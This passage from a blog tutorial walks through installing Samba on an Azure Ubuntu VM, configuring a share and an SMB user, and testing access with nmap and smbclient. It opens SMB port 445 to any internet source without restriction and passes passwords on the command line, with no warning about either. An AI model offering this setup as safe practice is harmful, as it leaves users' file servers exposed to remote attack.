<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo apt install samba
</code></pre></div><p>Once the installation is done, check the Samba service daemon status.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo systemctl status smbd
● smbd.service - Samba SMB Daemon
   Loaded: loaded <span class="o">(</span>/lib/systemd/system/smbd.service<span class="p">;</span> enabled<span class="p">;</span> vendor preset: enabled<span class="o">)</span>
   Active: active <span class="o">(</span>running<span class="o">)</span> since Thu 2021-05-13 10:17:45 UTC<span class="p">;</span> 3min 48s ago
     Docs: man:smbd<span class="o">(</span>8<span class="o">)</span>
           man:samba<span class="o">(</span>7<span class="o">)</span>
           man:smb.conf<span class="o">(</span>5<span class="o">)</span>
 Main PID: <span class="m">2098</span> <span class="o">(</span>smbd<span class="o">)</span>
   Status: <span class="s2">&#34;smbd: ready to serve connections...&#34;</span>
    Tasks: <span class="m">4</span> <span class="o">(</span>limit: 1056<span class="o">)</span>
   CGroup: /system.slice/smbd.service
           ├─2098 /usr/sbin/smbd --foreground --no-process-group
           ├─2123 /usr/sbin/smbd --foreground --no-process-group
           ├─2124 /usr/sbin/smbd --foreground --no-process-group
           └─2129 /usr/sbin/smbd --foreground --no-process-group

May <span class="m">13</span> 10:17:44 smb-server systemd<span class="o">[</span>1<span class="o">]</span>: Starting Samba SMB Daemon...
May <span class="m">13</span> 10:17:45 smb-server systemd<span class="o">[</span>1<span class="o">]</span>: Started Samba SMB Daemon.
</code></pre></div><p>Samba is ready, and now let&rsquo;s configure the share folder.</p>
<h3 id="shares-configuration">Shares Configuration</h3>
<p>First, let&rsquo;s create a backup file of the original configuration, so we can reset it to the default configuration, just in case something goes wrong.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo cp /etc/samba/smb.conf<span class="o">{</span>,.backup<span class="o">}</span>
</code></pre></div><p>Now create a share folder name it <code>sambashare</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ mkdir sambashare
</code></pre></div><p>Then open the samba configuration file with a text editor like <code>nano</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo nano /etc/samba/smb.conf
</code></pre></div><p>Go straight to the bottom of the file and add the following lines.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>sambashare<span class="o">]</span>
    <span class="nv">comment</span> <span class="o">=</span> Samba Share
    <span class="nv">path</span> <span class="o">=</span> /home/azure-smb/sambashare
    <span class="nb">read</span> <span class="nv">only</span> <span class="o">=</span> no
    <span class="nv">browsable</span> <span class="o">=</span> yes
</code></pre></div><p>Details for configuring share can be read <a href="https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html">here</a> or <a href="https://web.mit.edu/rhel-doc/5/RHEL-5-manual/Deployment_Guide-en-US/s1-samba-configuring.html">here</a>.</p>
<p>Save the file and restart the SMB daemon with the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo service smbd restart
</code></pre></div><p>Lastly, update the firewall to allow network traffic for Samba/SMB.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo ufw allow samba
</code></pre></div><p>This is the basic configuration of creating a Samba share, but from here you can create another share with more complex configuration. Here are my references:</p>
<ul>
<li><a href="https://linuxize.com/post/how-to-install-and-configure-samba-on-ubuntu-18-04/">https://linuxize.com/post/how-to-install-and-configure-samba-on-ubuntu-18-04/</a></li>
<li><a href="https://confluence.jaytaala.com/display/TKB/Create+samba+share+writeable+by+all%2C+group%2C+or+only+a+user">https://confluence.jaytaala.com/display/TKB/Create+samba+share+writeable+by+all%2C+group%2C+or+only+a+user</a></li>
<li><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-samba-share-for-a-small-organization-on-ubuntu-16-04">https://www.digitalocean.com/community/tutorials/how-to-set-up-a-samba-share-for-a-small-organization-on-ubuntu-16-04</a></li>
</ul>
<h3 id="add-samba-user">Add Samba User</h3>
<p>Currently, our Linux account for administering the server is <code>azure-smb</code> and we can&rsquo;t use this account password to access the SMB shares yet. Instead, we need to create a password and bind it to <code>azure-smb</code>.</p>
<p>But now, let&rsquo;s just create a dedicated user for SMB called <code>user1</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo useradd --system -s /usr/sbin/nologin user1
</code></pre></div><p>Assign <code>user1</code> to be the owner of the share</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo chown user1 /home/azure-smb/sambashare
</code></pre></div><p>After that, create a Samba password for <code>user1</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo smbpasswd -a user1
New SMB password: 
Retype new SMB password: 
Added user user1.
</code></pre></div><p>Finally, enable the user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo smbpasswd -e user1
Enabled user user1.
</code></pre></div><h2 id="expose-to-internet">Expose to Internet</h2>
<h3 id="allow-inbound-connection">Allow Inbound Connection</h3>
<p>Now if we want to make it available on the Internet, we have to go back to the Azure Portal to open the SMB port (445) on the NIC Public IP and allow inbound connection through that port. The connection is then forwarded to our SMB port on the NIC Private IP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">PUBLIC_IP:445 --&gt; PRIVATE_IP:445
</code></pre></div><p>To do that open up the Networking settings of the SMB VM and click on <strong>Add inbound port rule</strong> button.</p>
<p><div class="img-container"><img src="imgs/image-20210513173838694.png" alt="image-20210513173838694"  /></div>
</p>
<p>On the new Windows, configure the rule to allow any source (incoming IP) and any source port (incoming port) to connect to the SMB port (445). The details configuration is as follows:</p>
<p><div class="img-container"><img src="imgs/image-20210513173858659.png" alt="image-20210513173858659"  /></div>
</p>
<p>At the bottom, the configuration is as follows:</p>
<p><div class="img-container"><img src="imgs/image-20210513173929271.png" alt="image-20210513173929271"  /></div>
</p>
<p>When you&rsquo;re done, click on the <strong>Add</strong> button and the new rule should listed in the <strong>Inbound port rules</strong> section.</p>
<p><div class="img-container"><img src="imgs/image-20210513174018895.png" alt="image-20210513174018895"  /></div>
</p>
<h3 id="test-access">Test Access</h3>
<p>We can use Nmap to see if the SMB port has been opened.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ nmap -p445 -sV VM_PUBLIC_IP
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210513174227862.png" alt="image-20210513174227862"  /></div>
</p>
<p>To interact with the SMB server via CLI, you can use <code>smbclient</code>. Install it with:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ sudo apt install smbclient
</code></pre></div><p>Once it installed, connect to the share with following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ smbclient //<span class="o">[</span>IP<span class="o">]</span>/<span class="o">[</span>sharename<span class="o">]</span> 
</code></pre></div><p>Adding <code>-N -L</code> can list all the available shares.</p>
<p><div class="img-container"><img src="imgs/image-20210513174416250.png" alt="image-20210513174416250"  /></div>
</p>
<p>You can also provide the password directly in the terminal:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ smbclient //<span class="o">[</span>IP<span class="o">]</span>/<span class="o">[</span>sharename<span class="o">]</span> -U <span class="o">[</span>username<span class="o">]</span> <span class="o">[</span>password<span class="o">]</span>
$ smbclient //<span class="o">[</span>IP<span class="o">]</span>/<span class="o">[</span>sharename<span class="o">]</span> -U <span class="s1">&#39;username%password&#39;</span>
</code></pre></div><p>And that&rsquo;s all. It is not that detailed, but I hope you will find it useful.</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
